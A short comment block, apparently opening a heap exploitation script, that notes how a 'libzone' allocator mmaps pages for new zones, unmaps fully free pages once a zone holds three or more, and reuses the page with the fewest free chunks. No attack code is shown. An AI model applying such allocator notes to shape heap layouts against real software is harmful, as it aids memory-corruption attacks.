# We have to notice 3 things about libzone implementation:    
# 1. Zmalloc will create a new zone when the size has never been allocated before and will mmap a page for that zone. 
# A new page will also be created with mmap when there is no free space left in any pages belong to that zone.
#   
# 2. A page will be unmmap when that page has all free space and the number of page in a zone >= 3.  
# 3. Libzone will use free space in page with least free chunk.  

# P/s: Free space in libzone means that space was first allocated and then freed.
